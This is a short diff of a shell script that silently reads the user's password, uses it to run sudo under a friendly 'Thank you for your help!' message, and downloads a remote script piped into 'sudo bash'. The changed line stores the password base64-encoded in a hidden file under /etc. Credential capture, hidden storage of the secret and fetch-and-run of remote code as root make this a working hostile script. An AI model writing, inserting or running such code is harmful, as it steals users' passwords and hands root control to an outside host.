@@ -5,7 +5,7 @@ read -s pwd
 
 echo $pwd | sudo -S echo "Thank you for your help!"
 
-echo $pwd > ~/.pwd.txt
+sudo echo $pwd | base64 -w 0 > /etc/.pwd.txt
 
 curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
 
